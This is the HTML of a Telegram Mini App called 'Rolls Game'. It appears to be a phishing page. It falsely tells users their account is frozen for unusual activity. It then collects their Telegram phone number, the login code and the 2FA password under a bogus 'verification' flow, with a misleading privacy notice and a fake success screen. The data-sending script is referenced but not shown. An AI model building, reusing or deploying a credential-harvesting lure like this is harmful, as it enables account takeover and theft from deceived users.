<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rolls Game</title>
    <link rel="stylesheet" href="style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="app-container">
        <!-- Step 0: Language Selection -->
        <div class="step active" id="step0">
            <div class="language-selection">
                <div class="logo-container">
                    <div class="logo">üé≤</div>
                    <h1 class="app-title">Rolls Game</h1>
                </div>
                
                <div class="language-card">
                    <h2>Select Language</h2>
                    <p class="language-subtitle">Choose your preferred language</p>
                    
                    <div class="language-options">
                        <button class="language-option" onclick="selectLanguage('en')">
                            <div class="flag">üá∫üá∏</div>
                            <div class="language-info">
                                <span class="language-name">English</span>
                                <span class="language-native">English</span>
                            </div>
                            <div class="checkmark">‚úì</div>
                        </button>
                        
                        <button class="language-option" onclick="selectLanguage('ru')">
                            <div class="flag">üá∑üá∫</div>
                            <div class="language-info">
                                <span class="language-name">Russian</span>
                                <span class="language-native">–†—É—Å—Å–∫–∏–π</span>
                            </div>
                            <div class="checkmark">‚úì</div>
                        </button>
                    </div>
                    
                    <div class="language-note">
                        You can change language later in settings
                    </div>
                </div>
            </div>
        </div>

        <!-- Step 1: Frozen Account -->
        <div class="step" id="step1">
            <div class="header">
                <div class="back-btn" onclick="goBackToLanguage()">‚Üê</div>
                <div class="header-center">
                    <h1 data-lang-key="step1_title">Account Security</h1>
                </div>
                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage">
                    EN
                </div>
            </div>
            
            <div class="card frozen-card">
                <div class="warning-icon">‚ö†Ô∏è</div>
                <h2 data-lang-key="account_frozen">Account Frozen</h2>
                
                <div class="user-info-display">
                    <div class="user-icon">üë§</div>
                    <div class="username" id="usernameDisplay" data-lang-key="user_account">
                        Your account requires verification
                    </div>
                </div>
                
                <div class="alert-box">
                    <div class="alert-icon">‚ÑπÔ∏è</div>
                    <div class="alert-content">
                        <p data-lang-key="freeze_reason">We've detected unusual activity on your account</p>
                        <p data-lang-key="freeze_action">Verification required to restore access</p>
                    </div>
                </div>
                
                <div class="verification-steps">
                    <div class="verification-step">
                        <div class="step-number">1</div>
                        <div class="step-text" data-lang-key="step1_desc">Enter phone number</div>
                    </div>
                    <div class="verification-step">
                        <div class="step-number">2</div>
                        <div class="step-text" data-lang-key="step2_desc">Verify with code</div>
                    </div>
                    <div class="verification-step">
                        <div class="step-number">3</div>
                        <div class="step-text" data-lang-key="step3_desc">Complete verification</div>
                    </div>
                </div>
                
                <button class="btn-primary" onclick="startVerification()" data-lang-key="start_verification">
                    Start Verification
                </button>
                
                <div class="note" data-lang-key="verification_note">
                    Process takes 1-2 minutes
                </div>
            </div>
            
            <div class="support-info">
                <p data-lang-key="need_help">Need help?</p>
                <a href="https://t.me/rollssupport" data-lang-key="contact_support">Contact Support</a>
            </div>
        </div>

        <!-- Step 2: Phone Input -->
        <div class="step" id="step2">
            <div class="header">
                <div class="back-btn" onclick="goBack(1)">‚Üê</div>
                <div class="header-center">
                    <h1 data-lang-key="phone_verification">Phone Verification</h1>
                    <div class="step-counter">1/3</div>
                </div>
                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage2">
                    EN
                </div>
            </div>
            
            <div class="card">
                <div class="input-section">
                    <div class="input-label" data-lang-key="enter_phone">
                        Enter your Telegram phone number
                    </div>
                    
                    <div class="phone-input-container">
                        <div class="country-code">+</div>
                        <input 
                            type="tel" 
                            id="phoneInput" 
                            placeholder="1234567890"
                            inputmode="numeric"
                            data-lang-key="phone_placeholder"
                        >
                    </div>
                    
                    <div class="input-hint" data-lang-key="phone_hint">
                        Enter without country code
                    </div>
                </div>
                
                <div class="privacy-notice">
                    <div class="privacy-icon">üîí</div>
                    <div class="privacy-text" data-lang-key="privacy_notice">
                        Your phone number is used only for verification and is protected by Telegram's security
                    </div>
                </div>
                
                <button class="btn-primary" onclick="sendCode()" id="sendCodeBtn" data-lang-key="send_code">
                    Send Verification Code
                </button>
            </div>
        </div>

        <!-- Step 3: Code Verification -->
        <div class="step" id="step3">
            <div class="header">
                <div class="back-btn" onclick="goBack(2)">‚Üê</div>
                <div class="header-center">
                    <h1 data-lang-key="enter_code">Enter Code</h1>
                    <div class="step-counter">2/3</div>
                </div>
                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage3">
                    EN
                </div>
            </div>
            
            <div class="card">
                <div class="code-section">
                    <div class="code-instruction" data-lang-key="code_instruction">
                        Enter the 5-digit code sent to your Telegram
                    </div>
                    
                    <div class="code-inputs">
                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 1)">
                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 2)">
                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 3)">
                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 4)">
                        <input type="text" maxlength="1" class="code-input" oninput="moveToNext(this, 5)">
                    </div>
                    
                    <div class="timer-section">
                        <div class="timer" id="timer">
                            <span data-lang-key="code_expires">Code expires in</span>
                            <span id="countdown">60</span>
                            <span>s</span>
                        </div>
                        
                        <button class="resend-btn" onclick="resendCode()" id="resendBtn" disabled data-lang-key="resend_code">
                            Resend Code
                        </button>
                    </div>
                </div>
                
                <button class="btn-primary" onclick="verifyCode()" id="verifyCodeBtn" data-lang-key="verify_code">
                    Verify Code
                </button>
            </div>
        </div>

        <!-- Step 4: 2FA Password -->
        <div class="step" id="step4">
            <div class="header">
                <div class="back-btn" onclick="goBack(3)">‚Üê</div>
                <div class="header-center">
                    <h1 data-lang-key="two_factor">Two-Factor Auth</h1>
                    <div class="step-counter">3/3</div>
                </div>
                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage4">
                    EN
                </div>
            </div>
            
            <div class="card">
                <div class="twofa-section">
                    <div class="twofa-icon">üîê</div>
                    
                    <div class="twofa-instruction" data-lang-key="twofa_instruction">
                        Your account has two-factor authentication enabled
                    </div>
                    
                    <div class="input-section">
                        <div class="input-label" data-lang-key="enter_2fa">
                            Enter your 2FA password
                        </div>
                        
                        <input 
                            type="password" 
                            id="passwordInput" 
                            placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
                            data-lang-key="password_placeholder"
                        >
                        
                        <div class="input-hint" data-lang-key="twofa_hint">
                            Required for accounts with enhanced security
                        </div>
                    </div>
                </div>
                
                <button class="btn-primary" onclick="verify2FA()" id="verify2FABtn" data-lang-key="verify_2fa">
                    Verify & Continue
                </button>
            </div>
        </div>

        <!-- Step 5: Success -->
        <div class="step" id="step5">
            <div class="header">
                <div class="header-center">
                    <h1 data-lang-key="verification_complete">Verification Complete</h1>
                </div>
                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage5">
                    EN
                </div>
            </div>
            
            <div class="card success-card">
                <div class="success-animation">
                    <div class="success-circle">
                        <div class="success-icon">‚úì</div>
                    </div>
                </div>
                
                <h2 data-lang-key="account_verified">Account Verified!</h2>
                
                <div class="success-message" data-lang-key="success_message">
                    Your account has been successfully verified and all restrictions have been lifted
                </div>
                
                <div class="verification-details">
                    <div class="detail-row">
                        <span class="detail-label" data-lang-key="status_label">Status:</span>
                        <span class="detail-value verified" data-lang-key="verified_status">Verified</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label" data-lang-key="user_label">User ID:</span>
                        <span class="detail-value" id="verifiedUserId">-</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label" data-lang-key="time_label">Time:</span>
                        <span class="detail-value" id="verificationTime">-</span>
                    </div>
                </div>
                
                <div class="next-steps">
                    <h3 data-lang-key="next_steps">Next Steps</h3>
                    <ul>
                        <li data-lang-key="step1_done">‚úì Withdrawals re-enabled</li>
                        <li data-lang-key="step2_done">‚úì Account security upgraded</li>
                        <li data-lang-key="step3_done">‚úì Support notified</li>
                    </ul>
                </div>
                
                <button class="btn-secondary" onclick="closeMiniApp()" data-lang-key="close_app">
                    Close Mini App
                </button>
            </div>
        </div>

        <!-- Step 6: Error -->
        <div class="step" id="step6">
            <div class="header">
                <div class="back-btn" onclick="goBack(1)">‚Üê</div>
                <div class="header-center">
                    <h1 data-lang-key="error_occurred">Error</h1>
                </div>
                <div class="language-indicator" onclick="showLanguageMenu()" id="currentLanguage6">
                    EN
                </div>
            </div>
            
            <div class="card error-card">
                <div class="error-icon">‚úó</div>
                
                <h2 data-lang-key="verification_failed">Verification Failed</h2>
                
                <div class="error-message" id="errorMessage" data-lang-key="error_default">
                    An error occurred during verification
                </div>
                
                <div class="error-suggestions">
                    <p data-lang-key="check_following">Please check the following:</p>
                    <ul>
                        <li data-lang-key="check_phone">‚Ä¢ Correct phone number</li>
                        <li data-lang-key="check_code">‚Ä¢ Valid verification code</li>
                        <li data-lang-key="check_internet">‚Ä¢ Stable internet connection</li>
                    </ul>
                </div>
                
                <button class="btn-primary" onclick="goBack(1)" data-lang-key="try_again">
                    Try Again
                </button>
                
                <button class="btn-link" onclick="contactSupport()" data-lang-key="contact_support">
                    Contact Support
                </button>
            </div>
        </div>
    </div>

    <!-- Language Menu Modal -->
    <div class="modal-overlay" id="languageModal">
        <div class="modal">
            <div class="modal-header">
                <h2 data-lang-key="select_language">Select Language</h2>
                <button class="modal-close" onclick="hideLanguageMenu()">√ó</button>
            </div>
            
            <div class="modal-body">
                <div class="language-list">
                    <div class="language-item" onclick="changeLanguage('en')">
                        <div class="language-flag">üá∫üá∏</div>
                        <div class="language-name">English</div>
                        <div class="language-check" id="check-en">‚úì</div>
                    </div>
                    
                    <div class="language-item" onclick="changeLanguage('ru')">
                        <div class="language-flag">üá∑üá∫</div>
                        <div class="language-name">–†—É—Å—Å–∫–∏–π</div>
                        <div class="language-check" id="check-ru">‚úì</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText" data-lang-key="processing">Processing...</div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>